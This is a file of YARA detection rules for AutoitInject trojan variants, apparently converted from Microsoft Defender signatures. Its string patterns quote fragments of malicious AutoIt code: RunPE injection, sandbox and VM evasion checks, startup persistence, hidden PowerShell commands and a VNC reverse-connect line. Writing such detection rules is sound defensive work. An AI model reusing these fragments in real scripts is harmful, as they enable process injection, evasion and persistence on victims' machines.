rule Trojan_Win32_AutoitInject_BC_2147741469_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BC!MTB"
        threat_id = "2147741469"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE ( BINARYTOSTRING ( \"0x52756e50452840486f6d654472697665202620275c57696e646f77735c4d6963726f736f66742e4e45545c" ascii //weight: 1
        $x_1_2 = "4672616d65776f726b5c76342e302e33303331395c52656741736d2e657865272c" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_BD_2147741556_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BD!MTB"
        threat_id = "2147741556"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE ( BINARYTOSTRING ( \"0x52756e50452840486f6d654472697665202620275c57696e646f77735c4d6963726f736f66742e4e45545c" ascii //weight: 1
        $x_1_2 = "4672616D65776F726B5C76322E302E35303732375C52656741736D2E657865272C" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_BE_2147741586_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BE!MTB"
        threat_id = "2147741586"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE ( BINARYTOSTRING ( \"0x52756E50452840486F6D654472697665202620537472696E6752657665727365" ascii //weight: 1
        $x_1_2 = "28276578652E736376536765525C39313330332E302E34765C6B726F77656D6172465C54454E2E74666F736F7263694D5C73776F646E69575C27292C" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_BF_2147741642_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BF!MTB"
        threat_id = "2147741642"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "41"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "\"vboxtray.exe\"" ascii //weight: 10
        $x_10_2 = "\"vmtoolsd.exe\"" ascii //weight: 10
        $x_10_3 = "\"@AutoItExe\"" ascii //weight: 10
        $x_10_4 = "\"kernel32.dll\"" ascii //weight: 10
        $x_1_5 = "EXECUTE ( BINARYTOSTRING ( \"0x52756E504528" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_BG_2147742026_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BG!MTB"
        threat_id = "2147742026"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "40"
        strings_accuracy = "High"
    strings:
        $x_10_1 = " = BINARYTOSTRING ( \"0x" ascii //weight: 10
        $x_10_2 = " = @APPDATADIR & \"\\" ascii //weight: 10
        $x_10_3 = "CRYPTINTERNALDATA" ascii //weight: 10
        $x_10_4 = "( $WPATH , $LPFILE , $PROTECT , $PERSIST )" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_BH_2147742101_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BH!MTB"
        threat_id = "2147742101"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "31"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " ( $URL , $PATH )" ascii //weight: 1
        $x_1_2 = " ( \"ShellExecute\" )" ascii //weight: 1
        $x_1_3 = " = EXECUTE ( \"@HomeDrive & " ascii //weight: 1
        $x_1_4 = " = BINARYTOSTRING ( \"0x" ascii //weight: 1
        $x_1_5 = "$ARRAY = [ \"vmtoolsd.exe\" , \"vbox.exe\" ]" ascii //weight: 1
        $x_1_6 = " = @USERPROFILEDIR & \"\\" ascii //weight: 1
        $x_1_7 = " = @APPDATADIR & \"\\" ascii //weight: 1
        $x_10_8 = " = EXECUTE (" ascii //weight: 10
        $x_10_9 = "CRYPTINTERNALDATA" ascii //weight: 10
        $x_10_10 = " ( $WPATH , $LPFILE , $PROTECT , $PERSIST )" ascii //weight: 10
        $x_10_11 = " ( $FILE , $STARTUP , $RES , $RUN = " ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_10_*) and 1 of ($x_1_*))) or
            ((4 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_BI_2147742536_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BI!MTB"
        threat_id = "2147742536"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "51"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "winrarsfxmappingfile.tmp" ascii //weight: 10
        $x_10_2 = "GETPASSWORD1" ascii //weight: 10
        $x_10_3 = "__tmp_rar_sfx_access_check_%u" ascii //weight: 10
        $x_1_4 = {53 65 74 75 70 3d [0-10] 2e 76 62 73}  //weight: 1, accuracy: Low
        $x_1_5 = {53 65 74 75 70 3d [0-10] 2e 76 62 65}  //weight: 1, accuracy: Low
        $x_10_6 = "Path=%temp%\\" ascii //weight: 10
        $x_10_7 = "ARarHtmlClassName" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AR_2147742918_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AR!MTB"
        threat_id = "2147742918"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "48"
        strings_accuracy = "High"
    strings:
        $x_20_1 = "1D1J1P1Z1a1" ascii //weight: 20
        $x_1_2 = "FILEWRITE" wide //weight: 1
        $x_1_3 = "SHELLEXECUTE" wide //weight: 1
        $x_1_4 = "STRINGREGEXPREPLACE" wide //weight: 1
        $x_1_5 = "STRINGREPLACE" wide //weight: 1
        $x_1_6 = "STRINGREVERSE" wide //weight: 1
        $x_1_7 = "TCPACCEPT" wide //weight: 1
        $x_1_8 = "TCPCLOSESOCKET" wide //weight: 1
        $x_1_9 = "TCPCONNECT" wide //weight: 1
        $x_1_10 = "TCPNAMETOIP" wide //weight: 1
        $x_1_11 = "UBOUND" wide //weight: 1
        $x_1_12 = "UDPBIND" wide //weight: 1
        $x_1_13 = "UDPCLOSESOCKET" wide //weight: 1
        $x_1_14 = "WINWAITACTIVE" wide //weight: 1
        $x_1_15 = "STARTMENUCOMMONDIR" wide //weight: 1
        $x_1_16 = "STARTUPCOMMONDIR" wide //weight: 1
        $x_1_17 = "LOCALAPPDATADIR" wide //weight: 1
        $x_1_18 = "APPDATADIR" wide //weight: 1
        $x_20_19 = "adprovider.exe" wide //weight: 20
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_20_*) and 8 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_SP_2147743243_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SP!MTB"
        threat_id = "2147743243"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "57"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "290x446C6C43616C6C2824646C6C68616E646C652C2022626F6F6C222C2022" wide //weight: 1
        $x_8_2 = "FUNC _NAMEDPIPES_CALLNAMEDPIPE ( $" wide //weight: 8
        $x_8_3 = "= DLLCALL ( \"kernel32.dll\" , \"bool\" , \"CallNamedPipeW\"" wide //weight: 8
        $x_8_4 = "= DLLCALL ( \"kernel32.dll\" , \"bool\" , \"ConnectNamedPipe\"" wide //weight: 8
        $x_8_5 = "= BITOR ( $IOPENMODE , $__ACCESS_SYSTEM_SECURITY )" wide //weight: 8
        $x_8_6 = "= EXECUTE ( \"binarytostring\" )" wide //weight: 8
        $x_8_7 = "( \"riptDir@Sc\" , 3 )" wide //weight: 8
        $x_8_8 = "( \"r@TempDi\" , 7 )" wide //weight: 8
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RA_2147744389_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RA!eml"
        threat_id = "2147744389"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "appsruprov.exe" wide //weight: 1
        $x_1_2 = "APHostClient.exe" wide //weight: 1
        $x_1_3 = "FSoftware\\AutoIt v3\\AutoIt" wide //weight: 1
        $x_1_4 = "\\\\[\\\\nrt]|%%|%[-+ 0#]?([0-9]*|\\*)?(\\.[0-9]*|\\.\\*)?[hlL]?[diouxXeEfgGs]" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Win32_AutoitInject_J_2147744486_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.J!ibt"
        threat_id = "2147744486"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "ibt: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "logagentE" ascii //weight: 1
        $x_1_2 = "$STARTUPDIR = @USERPROFILEDIR & \"\\RDVGHelper\"" ascii //weight: 1
        $x_1_3 = "( \"runas\" , \"at.exe\" )" ascii //weight: 1
        $x_1_4 = {22 00 2e 00 65 00 78 00 [0-2] 65 00 76 00 6d 00 [0-2] 74 00 6f 00 6f 00 [0-2] 6c 00 73 00 64 00 22 00}  //weight: 1, accuracy: Low
        $x_1_5 = {22 2e 65 78 [0-2] 65 76 6d [0-2] 74 6f 6f [0-2] 6c 73 64 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Win32_AutoitInject_PJ_2147744487_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PJ!ibt"
        threat_id = "2147744487"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "ibt: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "$STARTUPDIR = @APPDATADIR & " ascii //weight: 1
        $x_1_2 = "\\RegAsm.exe" ascii //weight: 1
        $x_1_3 = {69 00 6d 00 65 00 4f 00 75 00 74 00 20 00 [0-2] 31 00 [0-2] 20 00 26 00 [0-2] 20 00 [0-2] 44 00 65 00 6c 00 20 00 2f 00 [0-2] 46 00 20 00 [0-2] 20 00 [0-2] 2f 00 63 00 [0-2] 20 00}  //weight: 1, accuracy: Low
        $x_1_4 = {69 6d 65 4f 75 74 20 [0-2] 31 [0-2] 20 26 [0-2] 20 [0-2] 44 65 6c 20 2f [0-2] 46 20 [0-2] 20 [0-2] 2f 63 [0-2] 20}  //weight: 1, accuracy: Low
        $x_1_5 = {22 00 2e 00 65 00 78 00 [0-2] 65 00 76 00 6d 00 [0-2] 74 00 6f 00 6f 00 [0-2] 6c 00 73 00 64 00 22 00}  //weight: 1, accuracy: Low
        $x_1_6 = {22 2e 65 78 [0-2] 65 76 6d [0-2] 74 6f 6f [0-2] 6c 73 64 22}  //weight: 1, accuracy: Low
        $x_1_7 = {22 00 65 00 78 00 65 00 76 00 [0-2] 62 00 6f 00 78 00 2e 00 22 00}  //weight: 1, accuracy: Low
        $x_1_8 = {22 65 78 65 76 [0-2] 62 6f 78 2e 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win32_AutoitInject_GJ_2147744488_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GJ!ibt"
        threat_id = "2147744488"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "ibt: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$STARTUPDIR = @APPDATADIR & " ascii //weight: 1
        $x_1_2 = "@HOMEDRIVE & \"\\Windows\\Microsoft.NET" ascii //weight: 1
        $x_1_3 = "FILEWRITE ( $EXEPATH , $BYTES )" ascii //weight: 1
        $x_1_4 = "FILEWRITE ( $VBSPATH , $VBS )" ascii //weight: 1
        $x_1_5 = "FILEWRITE ( $URLPATH , $URL )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_PA_2147745489_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PA!MTB"
        threat_id = "2147745489"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "( $FILE , $STARTUP , $RES )" ascii //weight: 1
        $x_1_2 = "( $VBSNAME , $FILENAME )" ascii //weight: 1
        $x_1_3 = "$XOR = BITXOR ( $XOR , $LEN + $II )" ascii //weight: 1
        $x_1_4 = "LOCAL $STARTUPDIR = @TEMPDIR & \"\\Narrator\"" ascii //weight: 1
        $x_1_5 = "( \"pcalua\" , \"appmgr.exe\" )" ascii //weight: 1
        $x_1_6 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 52 00 75 00 6e 00 50 00 45 00 28 00 40 00 53 00 63 00 72 00 69 00 70 00 74 00 46 00 75 00 6c 00 6c 00 50 00 61 00 74 00 68 00 2c 00 24 00 [0-32] 2c 00 46 00 61 00 6c 00 73 00 65 00 2c 00 46 00 61 00 6c 00 73 00 65 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {45 58 45 43 55 54 45 20 28 20 22 52 75 6e 50 45 28 40 53 63 72 69 70 74 46 75 6c 6c 50 61 74 68 2c 24 [0-32] 2c 46 61 6c 73 65 2c 46 61 6c 73 65 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_8 = "( $URL , $PATH )" ascii //weight: 1
        $x_1_9 = "LOCAL $VBSPATH =" ascii //weight: 1
        $x_1_10 = "LOCAL $EXEPATH =" ascii //weight: 1
        $x_1_11 = "LOCAL $BOOL = @SCRIPTDIR = $STARTUPDIR \"True\" \"False\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (10 of ($x*))
}

rule Trojan_Win32_AutoitInject_AN_2147748089_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AN!MSR"
        threat_id = "2147748089"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jokM.com" wide //weight: 1
        $x_1_2 = "rlUVZ.exe" wide //weight: 1
        $x_1_3 = "gRGt.exe" wide //weight: 1
        $x_1_4 = "UmfKb.exe" wide //weight: 1
        $x_1_5 = "jfipolko.exe" wide //weight: 1
        $x_1_6 = "Really cancel the installation" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_HAZ_2147750353_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HAZ!MTB"
        threat_id = "2147750353"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 00 55 00 4e 00 20 00 28 00 20 00 24 00 [0-48] 20 00 26 00 20 00 22 00 20 00 2f 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 20 00 26 00 20 00 24 00 [0-48] 20 00 5b 00 20 00 33 00 20 00 5d 00 20 00 26 00 20 00 22 00 2e 00 65 00 78 00 65 00 20 00 22 00 22 00 22 00 20 00 26 00 20 00 24 00 [0-48] 20 00 5b 00 20 00 32 00 20 00 5d 00 20 00 26 00 20 00 22 00 22 00 22 00 22 00 20 00 2c 00 20 00 22 00 22 00 20 00 2c 00 20 00 24 00 [0-48] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {52 00 55 00 4e 00 20 00 28 00 20 00 40 00 43 00 4f 00 4d 00 53 00 50 00 45 00 43 00 20 00 26 00 20 00 [0-48] 20 00 28 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_3 = {29 00 20 00 2c 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 22 00 22 00 20 00 2c 00 20 00 40 00 53 00 57 00 5f 00 48 00 49 00 44 00 45 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-48] 3d 00 20 00 22 00 30 00 78 00 22 00}  //weight: 1, accuracy: Low
        $x_1_5 = {52 00 45 00 54 00 55 00 52 00 4e 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 54 00 4f 00 53 00 54 00 52 00 49 00 4e 00 47 00 20 00 28 00 20 00 24 00 [0-48] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 00 4f 00 52 00 20 00 24 00 49 00 20 00 3d 00 20 00 31 00 20 00 54 00 4f 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-48] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 24 00 49 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {49 00 46 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 49 00 53 00 49 00 4e 00 54 00 20 00 28 00 20 00 24 00 [0-48] 20 00 29 00 20 00 54 00 48 00 45 00 4e 00}  //weight: 1, accuracy: Low
        $x_1_9 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 24 00 [0-48] 20 00 2d 00 20 00 24 00 [0-48] 20 00 29 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_JK_2147754380_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.JK!MTB"
        threat_id = "2147754380"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://trxcheats.com/buy.php?key=" ascii //weight: 1
        $x_1_2 = "http://trxcheats.com/valida.php" ascii //weight: 1
        $x_1_3 = "SHELLEXECUTE ( $MYURL & MACHINEID ( ) )" ascii //weight: 1
        $x_1_4 = "$HFILECHECK2 = @WORKINGDIR & \"\\TRX.dll\"" ascii //weight: 1
        $x_1_5 = "STEMPFILE = @TEMPDIR & \"\\temp\" & HEX ( RANDOM ( 0 , 65535 ) , 4 )" ascii //weight: 1
        $x_1_6 = "CRYPTINTERNALDATA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_JK_2147754380_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.JK!MTB"
        threat_id = "2147754380"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 00 48 00 45 00 4c 00 4c 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 57 00 41 00 49 00 54 00 20 00 28 00 20 00 22 00 50 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 22 00 64 00 65 00 6c 00 20 00 27 00 22 00 20 00 26 00 20 00 24 00 53 00 4d 00 4f 00 44 00 55 00 4c 00 45 00 20 00 26 00 20 00 22 00 5c 00 64 00 61 00 74 00 61 00 [0-4] 2e 00 7a 00 69 00 70 00 27 00 22 00 20 00 2c 00 20 00 40 00 53 00 43 00 52 00 49 00 50 00 54 00 44 00 49 00 52 00 20 00 2c 00 20 00 22 00 22 00 20 00 2c 00 20 00 40 00 53 00 57 00 5f 00 48 00 49 00 44 00 45 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 00 49 00 4c 00 45 00 4d 00 4f 00 56 00 45 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 64 00 61 00 74 00 61 00 [0-4] 2e 00 70 00 65 00 69 00 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 64 00 61 00 74 00 61 00 [0-4] 2e 00 7a 00 69 00 70 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 64 00 61 00 74 00 61 00 [0-4] 2e 00 7a 00 69 00 70 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {50 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 22 00 45 00 78 00 70 00 61 00 6e 00 64 00 2d 00 61 00 72 00 63 00 68 00 69 00 76 00 65 00 20 00 2d 00 6c 00 69 00 74 00 65 00 72 00 61 00 6c 00 70 00 61 00 74 00 68 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00 5c 00 64 00 61 00 74 00 61 00 [0-4] 2e 00 7a 00 69 00 70 00 20 00 2d 00 64 00 65 00 73 00 74 00 69 00 6e 00 61 00 74 00 69 00 6f 00 6e 00 70 00 61 00 74 00 68 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00 3b 00}  //weight: 1, accuracy: Low
        $x_1_5 = {50 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 22 00 45 00 78 00 70 00 61 00 6e 00 64 00 2d 00 41 00 72 00 63 00 68 00 69 00 76 00 65 00 20 00 2d 00 4c 00 69 00 74 00 65 00 72 00 61 00 6c 00 50 00 61 00 74 00 68 00 20 00 27 00 22 00 20 00 26 00 20 00 24 00 53 00 4d 00 4f 00 44 00 55 00 4c 00 45 00 20 00 26 00 20 00 22 00 5c 00 64 00 61 00 74 00 61 00 [0-4] 2e 00 7a 00 69 00 70 00 27 00 20 00 2d 00 44 00 65 00 73 00 74 00 69 00 6e 00 61 00 74 00 69 00 6f 00 6e 00 50 00 61 00 74 00 68 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SBR_2147770425_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SBR!MSR"
        threat_id = "2147770425"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://www.myexternalip.com/raw" wide //weight: 1
        $x_1_2 = "http://bot.whatismyipaddress.com" wide //weight: 1
        $x_1_3 = "AGETIPURL" wide //weight: 1
        $x_1_4 = "SLEEP ( GETPING" wide //weight: 1
        $x_1_5 = "M_AGENT = GETAGENTBYID " wide //weight: 1
        $x_1_6 = "SYSTEM_USESKILLBYSKILLID_FUNC_ISENABLED" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_MR_2147789279_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MR!MTB"
        threat_id = "2147789279"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$CMDLINE [ 1 ] = \"-viewer\" OR $CMDLINE [ 1 ] = \"-server\"" ascii //weight: 1
        $x_1_2 = "@TEMPDIR & \"\\JFS_Screen_Mirroring" ascii //weight: 1
        $x_1_3 = "$CMDLINE [ 0 ] >= 1 AND $CMDLINE [ 1 ] = \"-viewer" ascii //weight: 1
        $x_1_4 = "RUN ( @TEMPDIR & \"\\JFS_Screen_Mirroring\\\" & \"winvnc_server_32.exe\" & \" \" & \"-connect" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_MRR_2147789280_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MRR!MTB"
        threat_id = "2147789280"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SHELLEXECUTE ( \"https://mm8591.com" ascii //weight: 1
        $x_1_2 = "$VBCODE &= \"    H = (x Xor y Xor z)\" & @CRLF" ascii //weight: 1
        $x_1_3 = "$VBCODE &= \"    I = (y Xor (x Or (Not z)))\" & @CRLF" ascii //weight: 1
        $x_1_4 = "$VBCODE &= \"        lResult = lResult Xor &H80000000 Xor lX8 Xor lY8\" & @CRLF" ascii //weight: 1
        $x_1_5 = "STRINGREGEXPREPLACE ( $_THE_URL , \"https://|http://\" , \"\" )" ascii //weight: 1
        $x_1_6 = "_XXTEA_ENCRYPT" ascii //weight: 1
        $x_1_7 = "5589E5FF7514535657E8410000004142434445464748494A4B4C4D4E4F505152535455565758595A61626364" ascii //weight: 1
        $x_1_8 = "RUN ( \"regsvr32\" & CHR ( 32 ) & \"/s\" & CHR ( 32 ) & $FILE )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_MRR_2147789280_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MRR!MTB"
        threat_id = "2147789280"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "CHR ( 549 + -501 ) & CHR ( 621 + -501 ) & CHR ( 602 + -501 ) & CHR ( 558 + -501 ) & CHR ( 558 + -501 ) & CHR ( 549 + -501 )" ascii //weight: 10
        $x_1_2 = "CHR ( 549 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 )" ascii //weight: 1
